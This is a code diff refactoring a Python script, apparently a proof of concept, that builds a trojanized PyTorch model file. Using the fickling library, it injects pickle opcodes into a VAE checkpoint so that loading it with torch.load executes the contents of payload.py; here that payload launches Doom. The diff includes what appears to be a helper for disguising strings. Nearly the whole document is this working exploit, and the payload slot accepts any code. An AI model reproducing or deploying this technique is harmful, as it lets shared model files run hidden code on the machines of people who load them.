@@ -6,11 +6,10 @@ import pickle
 import pickletools as pt
 import tarfile
 
-import torch
 from fickling import pickle as p
 from fickling.pickle import Pickled
 
-from spiro import PlaceholderVariables, Variables, change_frame_len, count_ops, find_main_pickle
+from spiro import PlaceholderVariables, find_main_pickle
 from rememoize import postprocess
 
 if not (os.path.exists("doom/DOOM1.WAD") and os.path.exists("doom/doom_ascii")):
@@ -57,13 +56,13 @@ vae_pickle = Pickled.load(original_dump)
 
 # now we're going to fuck with vae_pickle, then do first_bytes + fucked vae_pickle + last_bytes and hope for the best
 
-vars = PlaceholderVariables() # count_ops(vae_pickle, p.Memoize))
+memos = PlaceholderVariables()  # count_ops(vae_pickle, p.Memoize))
 
 
 def set_value(new_value: p.Opcode) -> list[p.Opcode]:
     "_utils.__dict__.update({'_rebuild_tensor': new_value})"
     return [
-        vars["_utils"],
+        memos["_utils"],
         p.EmptyDict(),
         p.Unicode(b"_rebuild_tensor"),
         new_value,
@@ -110,13 +109,13 @@ def hidden_unicode(uni: bytes) -> list[p.Opcode]:
 exploit = [
     # from torch._utils import _rebuild_tensor as orig_rebuild_tensor
     *get_value(),
-    vars.add(p.Memoize(), "orig_rebuild_tensor"),
+    memos.assign("orig_rebuild_tensor"),
     p.Pop(),
     # from torch import _utils
     p.Unicode(b"torch"),
     p.Unicode(b"_utils"),
     p.StackGlobal(),
-    vars.add(p.Memoize(), "_utils"),
+    memos.assign("_utils"),
     p.Pop(),
     # _utils._rebuild_tensor = "builtins"
     # from torch._utils import _rebuild_tensor as builtins_str
@@ -129,7 +128,7 @@ exploit = [
     # to know what was imported here
     p.StackGlobal(),
     # _utils._rebuild_tensor = orig_rebuild_tensor
-    *set_value(vars["orig_rebuild_tensor"]),
+    *set_value(memos["orig_rebuild_tensor"]),
     # grab payload source
     p.Unicode(f'''exec("""{open("payload.py").read()}""") or payload'''.encode()),
     p.TupleOne(),
@@ -212,6 +211,6 @@ f.close()
 print("loading cool vae")
 # note! this launches doom! and waits for it to exit!
 # doom is poorly behaved and doesn't clean up the screen
-#cool_model = torch.load(output_path)
+# cool_model = torch.load(output_path)
 # print(cool_model)
 pt.dis(dumped, out=open("vae_dis", "w"))
